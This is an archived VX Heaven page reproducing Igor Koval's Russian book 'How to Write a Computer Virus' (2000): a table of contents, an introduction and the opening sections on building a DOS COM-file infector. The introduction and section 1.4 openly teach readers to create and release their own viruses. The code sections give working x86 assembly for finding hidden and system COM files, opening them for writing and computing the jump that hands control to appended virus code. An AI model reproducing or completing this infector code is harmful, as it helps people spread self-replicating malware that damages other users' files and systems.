<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>Игорь Коваль 'Как написать компьютерный вирус' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Игорь Коваль"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Коваль, Игорь,Как написать компьютерный вирус, boot, количество, файла, сектора, обработчик, секторов, функция, блока, диска, файл, винчестера, программе, указателя, push, байты"/>
<meta name="Description" content="В предлагаемой вашему вниманию книге просто и доходчиво рассказывается о принципах работы компьютерных вирусов различных типов и подробно описывается процесс их создания. Пособие рассчитано на пользователей, знакомых с языком ассемблера процессоров семейства х86 фирмы Intel, и может быть полезно профессиональным программистам, студентам технических ВУЗов и всем, кто интересуется программированием для персональных компьютеров на языках низкого уровня."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"fa03bf5dd7a6df607a538cc4decf194e38425695-1498758118-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vik00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div><div style="float:right;"><a href="/lib/index.php?tbs=0"><img src="/img/min.gif" alt="Minimize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: left;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="32" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><br clear="both"/></div>
<div class="s2"><h1>Как написать компьютерный вирус</h1><p><a href="/lib/?lang=ru&amp;author=%D0%9A%D0%BE%D0%B2%D0%B0%D0%BB%D1%8C%2C%20%D0%98%D0%B3%D0%BE%D1%80%D1%8C">Игорь Коваль</a><br/> <em>Изд. Символ</em><br/> <em>ISBN 5-93286-006-5</em><br/> <em> 2000</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vik00.html';</script><div class="ci"><a href="/lib/?ci=vik00">1</a></div>[<a style="" href="/lib/?lang=RU&amp;index=DO#vik00">Вернуться к списку</a>] [<a href="/lib/vik00.html#disqus_thread">Комментарии</a>]<br/> 
<p><em>Коваль, Игорь. Как написать компьютерный вирус : Практикум программирования на ассемблере<br/>
Игорь Коваль. - СПб. : Символ, 2000. - 189 с.; 21 см. - (Совершенно секретно). Библиогр. в подстроч. примеч.<br/>
ISBN 5-93286-006-5, 4000 экз.</em></p>
<p><a href="files/vik00_ru/koval.zip">Скачать текстовую версию книги (zip, кодировка KOI8-R, 88Kb)</a></p>
<img src="img/vik00_ru/cover.jpg" align="left" alt="Image: Book Cover"/>
<p>В предлагаемой вашему вниманию книге просто и доходчиво рассказывается о принципах работы компьютерных вирусов различных типов и подробно описывается процесс их создания. Книга содержит множество хорошо прокомментированных исходных текстов, различную справочную информацию. Прочитав эту книгу, вы не только в совершенстве освоите язык ассемблера и научитесь создавать собственные вирусные программы, но и повысите свой профессиональный уровень. Кроме того, устойчивое мнение о том, что "вирусы пишут только гении, мудрецы и "посвященные" покинет вас навсегда. Пособие рассчитано на пользователей, знакомых с языком ассемблера процессоров семейства х86 фирмы Intel, и может быть полезно профессиональным программистам, студентам технических ВУЗов и всем, кто интересуется программированием для персональных компьютеров на языках низкого уровня.</p>
<br clear="all"/>
<img src="img/vik00_ru/koval.jpg" align="right" alt="Photo: I. Koval"/>
<p>Игорь Коваль - инженер-электронщик, увлекающийся программированием. Изучая возможности ассемблера, он написал с чисто научными целями множество компьютерных вирусов, некоторые из которых представлены в этой книге. Является автором нескольких статей о компьютерных вирусах, опубликованных на сайте "Территория взлома" (www.hackzone.ru).</p>
<br clear="all"/>
<h2>Содержание</h2>
<ul>
<li><a href="#p0">Введение</a></li>
<li><a href="#p1">Часть 1. COM - вирусы</a>
<ul>
<li><a href="#p11">Глава 1. Разработка нерезидентной вирусной программы</a>
<ul>
<li><a href="#p111">1.1 Загрузка и выполнение COM - программы</a></li>
<li><a href="#p112">1.2 Как вирус может заразить COM - файл</a></li>
<li><a href="#p113">1.3 Работа вируса в зараженной программе</a></li>
<li><a href="#p114">1.4 Как начинается распространение вируса</a></li>
<li><a href="#p115">1.5 Начало работы</a></li>
<li><a href="#p116">1.6 Вирус получает управление</a></li>
<li><a href="#p117">1.7 Восстанавливаем зараженную программу</a></li>
<li><a href="#p118">1.8 Запоминаем содержимое DTA</a></li>
<li><a href="#p119">1.9 Ищем подходящий файл</a></li>
<li><a href="#p11a">1.10 Читаем исходные три байта</a></li>
<li><a href="#p11b">1.11 Выполняем необходимые расчеты</a></li>
<li><a href="#p11c">1.12 Проверяем файл на зараженность</a></li>
<li><a href="#p11d">1.13 Заражаем COM - программу</a></li>
<li><a href="#p11e">1.14 Восстанавливаем DTA</a></li>
<li><a href="#p11f">1.15 Передаем управление зараженной программе</a></li>
<li><a href="#p11g">1.16 Область данных вирусной программы</a></li>
<li><a href="#p11h">1.17 Завершаем запускающую программу</a></li>
<li><a href="#p11i">1.18 Текст нерезидентного COM - вируса</a></li>
<li><a href="#p11j">1.19 Комментарии</a></li>
<li><a href="#p11k">1.20 Испытание вируса</a></li>
</ul></li>
<li><a href="#p12">Глава 2. Разработка резидентной вирусной программы</a>
<ul>
<li><a href="#p121">2.1 Понятие резидентного ( TSR ) вируса</a></li>
<li><a href="#p122">2.2 Несколько слов о резидентных программах</a></li>
<li><a href="#p123">2.3 Алгоритм работы резидентного COM - вируса</a></li>
<li><a href="#p124">2.4 Заголовок вируса</a></li>
<li><a href="#p125">2.5 Вирус начинает работу</a></li>
<li><a href="#p126">2.6 Сохраняем регистры процессора</a></li>
<li><a href="#p127">2.7 Создаем секцию инициализации</a></li>
<li><a href="#p128">2.8 Запрашиваем блок памяти</a></li>
<li><a href="#p129">2.9 Делаем вирус " незаметным "</a></li>
<li><a href="#p12a">2.10 Получаем вектора прерываний</a></li>
<li><a href="#p12b">2.11 Копируем вирусный код в память</a></li>
<li><a href="#p12c">2.12 Устанавливаем вектора прерываний на вирусные обработчики</a></li>
<li><a href="#p12d">2.13 Пишем резидентную часть</a></li>
<li><a href="#p12e">2.14 Заражаем COM - файл</a></li>
<li><a href="#p12f">2.15 Восстанавливаем регистры</a></li>
<li><a href="#p12g">2.16 Пишем обработчики прерываний</a></li>
<li><a href="#p12h">2.17 Обработчик Int 13h</a></li>
<li><a href="#p12i">2.18 Обработчик Int 21h</a></li>
<li><a href="#p12j">2.19 Обработчик Int 24h</a></li>
<li><a href="#p12k">2.20 Обработчик Int 2Fh</a></li>
<li><a href="#p12l">2.21 Обработчик Int 28h</a></li>
<li><a href="#p12m">2.22 Область данных вируса</a></li>
<li><a href="#p12n">2.23 Процедура идентификации COMMAND.COM</a></li>
<li><a href="#p12o">2.24 Завершаем программу</a></li>
<li><a href="#p12p">2.25 Текст резидентного COM - вируса</a></li>
<li><a href="#p12q">2.26 Комментарии</a></li>
<li><a href="#p12r">2.27 Испытание вируса</a></li>
</ul></li>
</ul></li>
<li><a href="#p2">Часть 2. EXE - вирусы</a>
<ul>
<li><a href="#p21">Глава 1. Разработка нерезидентного EXE - вируса</a>
<ul>
<li><a href="#p211">1.1 Формат EXE - файла на диске</a></li>
<li><a href="#p212">1.2 Загрузка и выполнение EXE - программы</a></li>
<li><a href="#p213">1.3 Как вирус может заразить EXE - файл</a></li>
<li><a href="#p214">1.4 Работа вируса в зараженной программе</a></li>
<li><a href="#p215">1.5 Начало работы</a></li>
<li><a href="#p216">1.6 Вирус получает управление</a></li>
<li><a href="#p217">1.7 Ищем подходящий файл</a></li>
<li><a href="#p218">1.8 Читаем заголовок файла</a></li>
<li><a href="#p219">1.9 Производим необходимые вычисления</a></li>
<li><a href="#p21a">1.10 Заражаем EXE - программу</a></li>
<li><a href="#p21b">1.11 Восстанавливаем DTA</a></li>
<li><a href="#p21c">1.12 Восстанавливаем точку входа</a></li>
<li><a href="#p21d">1.13 Область данных вируса</a></li>
<li><a href="#p21e">1.14 Используемые процедуры</a></li>
<li><a href="#p21f">1.15 Работа завершена</a></li>
<li><a href="#p21g">1.16 Полный текст нерезидентного EXE - вируса</a></li>
<li><a href="#p21h">1.17 Несколько слов об испытании вируса</a></li>
</ul></li>
<li><a href="#p22">Глава 2. Разработка резидентного EXE - вируса</a>
<ul>
<li><a href="#p221">2.1 Алгоритм работы резидентного EXE - вируса</a></li>
<li><a href="#p222">2.2 Защита от программ - антивирусов</a></li>
<li><a href="#p223">2.3 Как реализовать защиту от эвристического анализа</a></li>
<li><a href="#p224">2.4 Реализуем предложенный алгоритм</a></li>
<li><a href="#p225">2.5 Пишем промежуточный обработчик</a></li>
<li><a href="#p226">2.6 Защита от обнаружения вируса в файле</a></li>
<li><a href="#p227">2.7 Несколько слов о вредных действиях вирусной программы</a></li>
<li><a href="#p228">2.8 Полный текст резидентного EXE - вируса</a></li>
</ul></li>
</ul></li>
<li><a href="#p3">Часть 3. Загрузочные вирусы</a>
<ul>
<li><a href="#p31">Глава 1. Разработка загрузочной вирусной программы</a>
<ul>
<li><a href="#p311">1.1 Краткие сведения о начальной загрузке персонального компьютера</a></li>
<li><a href="#p312">1.2 Понятие о загрузочных вирусах</a></li>
<li><a href="#p313">1.3 Алгоритм работы загрузочного вируса</a></li>
<li><a href="#p314">1.4 Как начинается распространение вируса</a></li>
<li><a href="#p315">1.5 Начало работы</a></li>
<li><a href="#p316">1.6 Вирус получает управление</a></li>
<li><a href="#p317">1.7 Защита от антивирусных программ</a></li>
<li><a href="#p318">1.8 Перехватываем Int 13h</a></li>
<li><a href="#p319">1.9 Читаем исходную BOOT - запись</a></li>
<li><a href="#p31a">1.10 Заражаем MBR винчестера</a></li>
<li><a href="#p31b">1.11 Пишем обработчик прерывания Int 13h</a></li>
<li><a href="#p31c">1.12 Используемые процедуры</a></li>
<li><a href="#p31d">1.13 Область данных вируса</a></li>
<li><a href="#p31e">1.14 Пишем секцию инсталляции</a></li>
<li><a href="#p31f">1.15 Текст загрузочного вируса</a></li>
<li><a href="#p31g">1.16 Комментарии</a></li>
<li><a href="#p31h">1.17 Испытание вируса</a></li>
</ul></li>
<li><a href="#p32">Глава 2. Еще один BOOT-вирус (<strong>Глава 6 (3 часть/глава 2) была добавлена позднее</strong>)</a>
<ul>
<li><a href="#p321">2.1 Краткие итоги предыдущей главы</a></li>
<li><a href="#p322">2.2 Объясняем полученные результаты</a></li>
<li><a href="#p323">2.3 Разрабатываем новый алгоритм активизации</a></li>
<li><a href="#p324">2.4 О перехвате Int 21h программой, загружаемой из Master Boot Record</a></li>
<li><a href="#p325">2.5 О применении вектора Int 16h</a></li>
<li><a href="#p326">2.6 Общий алгоритм работы вируса</a></li>
<li><a href="#p327">2.7 Полный текст созданного вируса</a></li>
<li><a href="#p328">2.8 Испытание вируса</a></li>
<li><a href="#p329">2.9 Вместо комментария</a></li>
</ul></li>
</ul></li>
<li><a href="#pe">Заключение</a></li>
<li><a href="#pl">Литература</a></li>
<li><a href="#pa1">Приложение 1. Краткий справочник по функциям MS DOS и BIOS</a></li>
<li><a href="#pa2">Приложение 2. Формат загрузочной записи для MS DOS различных версий</a></li>
<li><a href="#pa3">Приложение 3. Коды ошибок при выполнении функций MS DOS и BIOS</a></li>
</ul>
<h2><a name="p0">Введение</a></h2>
<p>Компьютерные вирусы со времени своего появления распространились чрезвычайно широко. Сейчас уже трудно найти человека,который бы ни разу не слышал об этих " существах ". И вместе с тем подавляющее большинство пользователей почти ничего не знают о том, что это такое, и склонны приписывать вирусам различные фантастические возможности, а также сильно преувеличивать их опасность.Словом,эта тема окутывается завесой таинственности. Такое положение возникло, главным образом, из - за почти полного отсутствия специальной литературы по данному вопросу ( причина этого вполне понятна ). А в имеющейся литературе для широкого круга читателей иногда можно встретить ошибочные и неправдоподобные сведения. Например, в одной очень распространенной и читаемой книге сказано, что некоторые вирусы "выживают" в компьютере даже после выключения питания! Неизвестно,что имел ввиду автор,но эта фраза полностью абсурдна. Дело в том, что при выключении питания содержимое оперативной памяти теряется, в ПЗУ записать что - либо невозможно, а в CMOS - памяти свободного места для хранения вирусного кода никогда не хватит. Вирус может "выжить" в компьютере разве что на жестком диске, но этой способностью обладают все вирусные программы. Книга, которая предлагается вашему вниманию, написана с использованием собственных разработок, наблюдений и экспериментов автора. Изложение рассчитано на пользователей, знакомых с языком ассемблера микропроцессоров семейства 8086 фирмы INTEL. Автор рассказывает о принципах работы компьютерных вирусов и подробно описывает процесс создания нерезидентных, резидентных и загрузочных вирусов. Разработка программ ведется от простого к сложному. Предыдущие программы становятся основой для разработки последующих. Читатель найдет в книге большое количество хорошо прокомментированных исходных текстов. Каждая фаза создания вирусов подробно объясняется. В общем,читайте и совершенствуйтесь! Разобравшись с программами, приведенными в книге, вы сможете создавать собственные вирусы, а главное - повысите свой профессиональный уровень. Кроме того, устойчивое мнение, что "Вирусы пишут только гении,мудрецы и "посвященные" покинет вас навсегда.</p>
<pre>
				УДАЧИ!
				18.08.1998
				Автор.
</pre>
<h2><a name="p1">Часть 1. COM - вирусы</a></h2>
<h3><a name="p11">Глава 1. Разработка нерезидентной вирусной программы</a></h3>
<p><em>* Эта глава написана "по мотивам" [ 3 ] и не претендует на оригинальность. Предложенная в книге П.Л.Хижняка программа существенно переработана, исправлены замеченные ошибки и глюки. Так что Главу 1 можно рассматривать как "ре-мэйк" разработки тов. Хижняка.</em></p>
<h4><a name="p111">1.1 Загрузка и выполнение COM - программы</a></h4>
<p>Для того, чтобы дальнейшее изложение стало более понятным, следует немного рассказать о действиях MS DOS при запуске программы типа COM. Для запуска программ в системе MS DOS используется специальная функция EXEC. Действия этой функции при запуске COM - программы выглядят так:</p>
<ol>
<li>Запускаемой программе отводится вся свободная в данный момент оперативная память. Сегментная часть начального адреса этой памяти обычно называется начальным сегментом программы.</li>
<li>По нулевому смещению в сегменте, определяемом начальным сегментом программы, EXEC строит специальную служебную структуру - так называемый PSP (Program Segment Prefix), в котором содержится информация,необходимая для правильной работы программы. Заполняет PSP операционная система (ОС), а его размер всегда равен 100h (256) байт.</li>
<li>Сразу вслед за PSP загружается сама COM - программа.</li>
<li>EXEC выполняет настройку регистров процессора. При этом устанавливаются такие значения: CS = DS = SS = ES указывают на начальный сегмент программы, регистр IP инициализируется числом 100h, а регистр SP - числом 0fffeh.</li>
<li>Теперь загруженную COM - программу можно исполнить. Для этого EXEC передает управление по адресу CS: 100h. После завершения программы управление передается обратно в EXEC, а оттуда программе - предку.</li>
</ol>
<p>Таким образом,по адресу CS : 100h обязательно должна стоять первая исполняемая команда. Чаще всего это команда перехода, но допустимо использовать и другие. Следует также напомнить, что в MS DOS размер COM - файла не может превышать 64 Кбайт. В самом деле, ведь COM - формат предполагает размещение программных кодов, данных и стека в одном сегменте оперативной памяти. А размер сегмента как раз и ограничен 64 Кбайтами.</p>
<h4><a name="p112">1.2 Как вирус может заразить COM - файл</a></h4>
<p>Под заражением понимают присоединение вирусом своего кода к файлу. При этом вирус должен так модифицировать заражаемый файл, чтобы получить управление при его запуске. Существует несколько методов заражения COM - программ. Вирусный код может записываться в конец, начало и даже в середину файла.Каждый из этих способов имеет свои достоинства и недостатки. Мы же рассмотрим запись вирусного кода в конец файла. Такой прием используется в подавляющем большинстве вирусов, и обеспечивает хорошие результаты при сравнительно простой реализации.</p>
<p>Итак, вирус записывает свой код в конец файла. Для того,чтобы при старте этот код получил управление и начал выполняться, во время заражения программа несколько модифицируется.</p>
<p>С этой целью используется трехбайтовая команда прямого ближнего перехода. Вирус записывает эту команду вместо первых трех байт заражаемого файла, а исходные три байта сохраняет в своей области данных. Теперь при запуске зараженной программы код вируса всегда будет выполняться первым.</p>
<h4><a name="p113">1.3 Работа вируса в зараженной программе</a></h4>
<p>Получив управление при старте зараженной программы, вирус выполняет следующие действия:</p>
<ol>
<li>Восстанавливает в памяти компьютера исходные три байтa этой программы.</li>
<li>Ищет на диске подходящий COM - файл.</li>
<li>Записывает свое тело в конец этого файла.</li>
<li>Заменяет первые три байта заражаемой программы командой перехода на свой код, сохранив предварительно исходные три байта в своей области данных.</li>
<li>Выполняет вредные действия, предусмотренные автором.</li>
<li>Передает управление зараженной программе. Поскольку в COM - файле точка входа всегда равна CS:100h, можно не выполнять сложных расчетов, а просто выполнить переход на этот адрес.</li>
</ol>
<p>Если же подходящих для заражения COM - файлов найдено не было, то вирус просто осуществляет переход на начало зараженной программы, из которой он и стартовал.</p>
<p>После этого зараженная программа выполняется, как обычно.</p>
<p>Сам вирусный код выполняется очень быстро и для пользователя ЭВМ этот процесс остается незаметным. Стоит заметить, что п.5 может вообще не выполняться. Существуют вирусы, которые никак не проявляют себя, кроме размножения (например, VIENNA 534). Вместе с тем есть и такие, которые способны нанести определенный вред файлам или диску. Например, вирус ANTI_EXE мешает нормально работать с EXE - файлами, DARK AVENGER записывает бессмысленную информацию в случайные сектора диска, а ONEHALF шифрует сектора на винчестере один за другим. Все зависит от изобретательности автора.</p>
<h4><a name="p114">1.4 Как начинается распространение вируса</a></h4>
<p>Очевидно, чтобы вирус распространился, его нужно внедрить в вычислительную систему. Делается это так:</p>
<ol>
<li>Автор разрабатывает вирусную программу. Обычно для этой цели используется язык ассемблера, так как программы, написанные на нем,выполняются очень быстро и имеют малый размер. Хотя есть вирусы, написанные на языке TURBO C и даже на TURBO PASCAL.</li>
<li>Исходный текст программы компилируется, и из него создается исполняемый файл (обычно типа COM). Этот файл предназначен для того, чтобы " выпустить вирус на свободу". Назовем программу, записанную в этом файле, запускающей.</li>
<li>Запускающая программа выполняется на машине, которую необходимо заразить.</li>
<li>Выпущенный на свободу вирус выполняет действия, описанные в 1.3. Различие заключается только в выполнении п.1. А именно - при восстановлении в памяти исходных трех байтов программы на их место записывается команда перехода, передающая управление коду завершения запускающей программы. Таким образом, при выполнении п.6 управление будет отдано операционной системе, а на диске образуется зараженный файл. При копировании этого файла на другие компьютеры и их запуске вирус начнет распространяться.</li>
</ol>
<p>Итак, займемся изготовлением COM - вируса...</p>
<h4><a name="p115">1.5 Начало работы</a></h4>
<p>Для разработки вируса лучше всего использовать COM формат.Это сделает его отладку более простой и наглядной. Кроме того, структура COM - программы намного проще и понятнее, чем структура программы в формате EXE. Поэтому напишем стандартное начало COM программы:</p>
<pre class="source">
    prg segment
       assume cs:prg,ds:prg,es:prg,ss:prg
          org 100h
</pre>
<p>Директива "assume cs:prg,ds:prg,es:prg,ss:prg" назначает все сегментные регистры одному сегменту с именем PRG, а директива "org 100h" нужна для резервирования места для PSP.</p>
<h4><a name="p116">1.6 Вирус получает управление</a></h4>
<p>После этого вступления начинается собственно исполняемая часть программы (метка START):</p>
<pre class="source">
    start:     jmp vir                ;Передача управ-
                                      ;ления вирусному
                                      ;коду. ..
	       org 110h
</pre>
<p>Команда "jmp vir" передает управление вирусному коду, а директива "org 110h" указывает компилятору размещать все коды после метки "vir",начиная с адреса 110h. Число 110h принято для удобства расчета смещений при разработке вируса. Чуть позже мы разберемся, зачем понадобилась команда "jmp vir", а пока продолжим:</p>
<pre class="source">
    vir:       push ds                ;Сохраним DS. ..
                                      ;Корректируем
               mov ax,ds              ;регистр DS . ..
               db 05h                 ;Код команды
    add_to_ds: dw 0                   ; " ADD AX,00h "
	       mov ds,ax              ;AX -> DS   . ..
</pre>
<p>Поскольку в зараженной программе область данных вируса будет сдвинута хотя бы на длину этой программы, необходимо выполнить коррекцию регистра DS. Коррекция осуществляется прибавлением к его содержимому длины программы в параграфах,округленной в большую сторону. Например, длина программы составляет 401 байт. Тогда она содержит 25 полных параграфов и еще 1 байт. Округленное число параграфов будет равно 26. Эта величина и прибавляется к регистру DS. При заражении вирус рассчитывает корректирующее число и записывает его в область "add_to_ds". Теперь всякий раз при запуске зараженной программы оно будет использоваться вирусом для исправления DS. В запускающей программе DS корректировать не нужно, и поэтому для нее "add_to_ds" равно нулю.</p>
<h4><a name="p117">1.7 Восстанавливаем зараженную программу</a></h4>
<p>Как было указано в 1.3 ( п.1 ), вирус должен после запуска зараженной программы восстановить в памяти компьютера ее исходные три байтa (не на диске, а только в памяти!). Пусть вирус хранит исходные три байта в области "old_bytes". Итак:</p>
<pre class="source">
    fresh_bytes:
	       mov al,old_bytes
	       mov cs:[100h],al
	       mov al,old_bytes+1
	       mov cs:[101h],al
	       mov al,old_bytes+2
	       mov cs:[102h],al
</pre>
<p>Вы конечно знаете,что в COM - программе при ее загрузке по адресу CS:100h всегда находится первая исполняемая команда. В остальном работа фрагмента ясна.</p>
<h4><a name="p118">1.8 Запоминаем содержимое DTA</a></h4>
<p>Data Transfer Arrea (DTA) является одной из служебных структур MS DOS. Эта область находится в PSP по смещению 80h, и активно используется последней при работе с файлами. Например,многие функции MS DOS обращаются к DTA для чтения или модификации ее содержимого. Поскольку DOS строит PSP для каждой вновь запускаемой программы, для каждой из них создается и своя DTA.</p>
<p>Так как наш вирус будет использовать при заражении и поиске файлов функции DOS,содержимое DTA зараженной программы будет испорчено, и она, скорее всего, не будет нормально работать.Поэтому содержимое DTA необходимо сохранить. Для этой цели выделим массив из 128 байт с именем "old_dta":</p>
<pre class="source">
	       mov cx,80h             ;Размер DTA -
                                      ;128 байт. ..
	       mov bx,80h             ;Смещение к DTA
	       lea si,old_dta         ;Адрес массива
    save_dta:
	       mov al,byte ptr cs:[bx];Читаем из DTA
                                      ;байт и  перено-
	       mov ds:[si],al         ;сим его в мас-
                                      ;сив. ..
	       inc bx                 ;К новому байту
	       inc si                 ;
	       loop save_dta          ;Цикл 128 раз
</pre>
<p>Работа фрагмента пояснений не требует...</p>
<h4><a name="p119">1.9 Ищем подходящий файл</a></h4>
<p>Теперь самое время заняться поиском файла для заражения. Для поиска файла - жертвы мы будем использовать пару функций DOS : 4Eh (поиск первого файла) и 4Fh (поиск следующего файла). При вызове 4Eh в регистр CX помещаются атрибуты искомого файла, а в DX - его имя и расширение. Установленная нами маска предполагает поиск COM-файла, с атрибутами "archive","system" и "hidden".Функция 4Fh используется уже после того, как функция 4Eh нашла первый файл, удовлетворяющий нашим требованиям. Вирус будет вызывать ее в том случае, если найденный файл ему не подходит (например, он слишком велик). Имя найденного файла описанные выше функции помещают в DTA по смещению 01eh. А теперь приведем программный фрагмент, выполняющий поиск файла:</p>
<pre class="source">
    find_first:
	       mov ah,4eh             ;Поиск первого
                                      ;файла. ..
	       mov cx,00100110b       ;archive, system
                                      ;hidden
	       lea dx,maska           ;Маска для поис-
                                      ;ка
	       int 21h
	       jnc r_3                ;Нашли !
	       jmp restore_dta        ;Ошибка !

    find_next: mov ah,3eh             ;Закроем  непод-
	       int 21h                ;ходящий файл...
	       jnc r_2
	       jmp restore_dta        ;Файл нельзя за-
                                      ;крыть !

    r_2:       mov ah,4fh             ;И найдем сле-
	       int 21h                ;дующий. ..
	       jnc r_3                ;Файл найден !
	       jmp restore_dta        ;Ошибка !

    r_3:       mov cx,12              ;Сотрем в буфере
	       lea si,fn              ;"fn" имя  пред-
    destroy_name:                     ;ыдущего файла
	       mov byte ptr [si],0    ;
	       inc si                 ;
	       loop destroy_name      ;Цикл 12 раз. ..

               xor si,si              ;И запишем в бу-
    copy_name: mov al,byte ptr cs:[si+9eh]
                                      ;фер имя только
	       cmp al,0               ;что найденного
                                      ;файла. ..
	       je open                ;В конце имени в
	       mov byte ptr ds:fn[si],al
                                      ;DTA всегда сто-
               inc si                 ;ит ноль, его мы
	       jmp copy_name          ;и хотим достичь
</pre>
<p>Имя файла в буфере "fn" необходимо стирать вот почему. Например, первым был найден файл COMMAND.COM, и пусть он не подошел вирусу.Тогда вирус попытается найти следующий файл. Пусть это будет WIN.COM. Его имя запишется в область " fn ", и она примет вид: WINMAND.COM. Такого файла на диске, скорее всего, нет; если же попробовать к нему обратиться, это вызовет ошибку, и вирус закончит работу. Чтобы этого не случалось, область " fn " после каждого файла очищается. При ошибках в выполнении системных функций управление передается на метку "restore_dta". Затем вирус восстанавливает DTA зараженной программы и осуществляет переход на ее начало.</p>
<h4><a name="p11a">1.10 Читаем исходные три байта</a></h4>
<p>Итак,вирус нашел COM - программу, которую теперь следует заразить. Но сначала необходимо сохранить первые три байта этой программы (<a href="#p113">см. 1.3</a>, п.4). Для этого файл нужно сначала открыть, а затем считать его первые три байта, что и реализуют приведенные ниже программные строки. Напомним, что имя файла хранится в строке "fn".</p>
<pre class="source">
    open:      mov ax,3d02h           ;Открыть файл
                                      ;для чтения и
                                      ;записи. ..
	       lea dx,fn              ;Имя файла. ..
	       int 21h                ;
	       jnc save_bytes
	       jmp restore_dta        ;Файл не откры-
                                      ;вается !

    save_bytes:                       ;Считаем три
                                      ;байта :
	       mov bx,ax              ;Сохраним дес-
                                      ;криптор в BX
	       mov ah,3fh             ;Номер функции
	       mov cx,3               ;Сколько байт ?
	       lea dx,old_bytes       ;Буфер для счи-
                                      ;тываемых данных
	       int 21h
	       jnc found_size
	       jmp close              ;Ошибка !
</pre>
<p>Приведенный фрагмент помещает прочитанную информацию в область "old_bytes". Остальное ясно из комментариев.</p>
<h4><a name="p11b">1.11 Выполняем необходимые расчеты</a></h4>
<p>В этом пункте мы покажем, как вирус проводит расчет корректирующего числа для регистра DS (<a href="#p114">см. 1.4</a>), а также смещения на свой код. Напомним, что это смещение записывается в начало заражаемого файла и зависит от его длины. Исходной величиной для расчета служит длина заражаемого файла,которую DOS вместе с именем найденного файла и рядом других его характеристик помещает в DTA. Размер записывается в DTA по смещению 01Ah (младшее слово) 1Ch (старшее). Так как длина COM - файла не может быть больше 65535 байт, она помещается в младшее слово целиком.А слово по смещению 01Ch обнуляется! Вышеуказанные расчеты можно произвести следующим образом:</p>
<pre class="source">
    found_size:
	       mov ax,cs:[09ah]       ;Найдем размер
                                      ;файла
    count_size:mov si,ax
	       cmp ax,64000           ;Файл длиннее
                                      ;64000 байт ?
	       jna toto               ;Нет. ..
	       jmp find_next          ;Да - тогда он
                                      ;нам не подходит
    toto:      test ax,000fh          ;Округлим размер
	       jz krat_16             ;до целого числа
	       or ax,000fh            ;параграфов    в
	       inc ax                 ;большую сторону
    krat_16:   mov di,ax              ;И  запишем  ок-
                                      ;ругленное  зна-
                                      ;чение в DI. ..
                                      ;Расчитаем  сме-
                                      ;щение для пере-
                                      ;хода на код ви-
                                      ;руса. ..
	       sub ax,3               ;Сама    команда
                                      ;перехода  зани-
                                      ;мает три байта!
	       mov byte ptr new_bytes[1],al
                                      ;Смещение найде-
	       mov byte ptr new_bytes[2],ah
                                      ;но !
	       mov ax,di              ;Сколько   пара-
	       mov cl,4               ;графов содержит
	       shr ax,cl              ;заражаемая про-
	                              ;грамма ?
               dec ax                 ;Учитываем дейс-
                                      ;твие директивы
                                      ;ORG 110h. ..
	       mov byte ptr add_to_ds,al
                                      ;Корректирующее
	       mov byte ptr add_to_ds+1,ah
                                      ;число найдено !
</pre>
